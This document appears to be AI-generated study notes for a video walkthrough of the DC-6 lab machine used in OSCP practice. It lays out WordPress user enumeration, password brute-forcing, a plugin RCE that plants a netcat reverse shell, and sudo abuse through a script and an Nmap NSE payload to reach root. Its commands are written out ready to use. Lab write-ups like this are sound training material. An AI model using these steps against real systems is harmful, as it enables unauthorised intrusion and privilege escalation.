@@ -1,0 +1,79 @@
+This document provides comprehensive notes and a consolidated list of commands for the DC-6 penetration test, which is a common machine used for OSCP preparation, as outlined in the video you provided.
+
+The full compromise of the machine relies on chaining three privilege escalation steps: **Brute-Force** to gain initial access, **Plugin RCE** to get a low-privilege shell (`www-data`), **Plaintext Password** to get a regular user shell (`graham`), **Abusing Sudo Rights** to get a higher-privilege user shell (`jens`), and finally, **Nmap Scripting** to gain a **root** shell.
+
+***
+
+## 📝 OSCP DC-6 Walkthrough Notes
+
+### I. Initial Enumeration & Gaining Access
+
+| Step | Summary & Tool | Key Findings & Commands | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **Setup** | Configure host resolution. | Edit `/etc/hosts` to map the target IP to the hostname **wordy**. | [[09:15](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=555)] |
+| **Scanning** | Full port scan and service enumeration. | **Ports Open:** **22 (SSH)** and **80 (HTTP)**. **Service:** **WordPress 5.1.1** on an Apache/Debian server. | [[27:33](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=1653)] |
+| **User Enumeration** | Use WPScan to find valid users. | **Users Found:** `admin`, `jens`, `graham`, `mark`, and `sarah`. | [[38:13](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=2293)] |
+| **Wordlist Prep** | Filter the large `rockyou.txt` wordlist based on a hint from the author. | **Command:** `cat /usr/share/wordlists/rockyou.txt \| grep -i 'ko1' > passwords` | [[39:18](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=2358)] |
+| **Brute-Force** | Brute-force the enumerated users against the filtered password list. | **Command:** `wpscan --url TARGET_URL -U users -P passwords` **Credentials Found:** `mark:helpdesk01` | [[41:09](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=2469)] |
+| **Initial Shell** | Log in and identify the vulnerable plugin. | Log in to `/wp-admin` with `mark:helpdesk01`. Discover the **Activity Monitor** plugin is running. | [[47:08](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=2828)] |
+| **Exploit RCE** | Find and execute an authenticated RCE exploit for the plugin. | **Search:** `searchsploit wordpress activity monitor` **Exploit-DB ID:** **50110** (Authenticated RCE). Use the exploit to plant a netcat reverse shell to your listener. | [[49:00](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=2940)] |
+
+***
+
+### II. Post-Exploitation & Lateral Movement
+
+| Step | Summary & Tool | Key Findings & Commands | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **Stabilize Shell** | Upgrade the `www-data` shell to a stable PTY. | **Commands:** 1. `python -c 'import pty; pty.spawn("/bin/bash")'` 2. `stty raw -echo` (after backgrounding with `Ctrl+Z` and using `fg`) | [[53:13](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3193)] |
+| **Lateral Clue 1** | Search the home directories for plaintext credentials. | **Clue Path:** `/home/mark/stuff/things-to-do` **Credentials Found:** Password for user **graham**. | [[58:19](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3499)] |
+| **Lateral Movement** | Switch user to `graham`. | **Command:** `su graham` (This gets you out of the limited `www-data` user to a real user account). | [[59:09](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3549)] |
+
+***
+
+### III. Privilege Escalation to Root (Root Flag)
+
+The root escalation involves a two-stage abuse of misconfigured `sudo` permissions.
+
+| Step | Summary & Tool | Key Findings & Commands | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **PrivEsc Stage 1 Recon** | Check `sudo` permissions for `graham`. | **Command:** `sudo -l` **Result:** `graham` can run `/home/jens/backups.sh` as user **jens**. | [[01:00:48](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3648)] |
+| **PrivEsc Stage 1 Exploit** | Overwrite the script to gain a shell as `jens`. | 1. **Plant Shell:** `echo "/bin/bash" >> /home/jens/backups.sh` 2. **Execute as Jens:** `sudo -u jens /home/jens/backups.sh` | [[01:01:05](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3665)] |
+| **PrivEsc Stage 2 Recon** | Check `sudo` permissions for `jens`. | **Command:** `sudo -l` **Result:** `jens` can run **`/usr/bin/nmap`** as **root**. | [[01:02:44](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3764)] |
+| **PrivEsc Stage 2 Exploit** | Abuse Nmap's scripting engine (NSE) to execute a command as root. | 1. **Create Malicious NSE:** `echo 'os.execute("/bin/bash")' > /var/tmp/root.nse` 2. **Execute as Root:** `sudo /usr/bin/nmap --script /var/tmp/root.nse` | [[01:05:12](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3912)] |
+| **Root Shell** | You now have a root shell (`#`). | **Commands:** `id` to confirm root, `cat /root/flag.txt` to retrieve the final flag. | [[01:06:14](http://www.youtube.com/watch?v=RjvPc8OmjSE&t=3974)] |
+
+***
+
+## ⚙️ Consolidated Commands Reference
+
+### Nmap & Setup
+| Command | Purpose |
+| :--- | :--- |
+| `echo "TARGET_IP wordy" \| sudo tee -a /etc/hosts` | Configure hostname resolution. |
+| `nmap -p- -sc -sv TARGET_IP --open` | Full port scan for services. |
+| `wpscan --url TARGET_URL -e p,t,u` | Enumerate WordPress users, plugins, and themes. |
+
+### Initial Access (Brute-Force & RCE)
+| Command | Purpose |
+| :--- | :--- |
+| `cat /usr/share/wordlists/rockyou.txt \| grep -i 'ko1' > passwords` | Filter wordlist for targeted brute-force. |
+| `wpscan --url TARGET_URL -U users -P passwords` | Brute-force credentials. |
+| `nc -nlvp 1` | Start a netcat listener to catch the reverse shell. |
+
+### Post-Exploitation (Shell & Lateral Movement)
+| Command | Purpose |
+| :--- | :--- |
+| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell to a proper PTY. |
+| `su graham` | Switch user to `graham` using the found plaintext password. |
+
+### Privilege Escalation (Two-Stage Sudo Abuse)
+| Command | Purpose |
+| :--- | :--- |
+| `sudo -l` | Check current user's `sudo` permissions. |
+| `echo "/bin/bash" >> /home/jens/backups.sh` | Plant a shell payload into the script executable by `graham`. |
+| `sudo -u jens /home/jens/backups.sh` | Execute the script to gain a shell as `jens`. |
+| `echo 'os.execute("/bin/bash")' > /var/tmp/root.nse` | Create a malicious Nmap Scripting Engine (NSE) payload. |
+| `sudo /usr/bin/nmap --script /var/tmp/root.nse` | Execute the malicious NSE as root to gain a root shell. |
+
+[http://www.youtube.com/watch?v=RjvPc8OmjSE](http://www.youtube.com/watch?v=RjvPc8OmjSE)
+http://googleusercontent.com/youtube_content/0
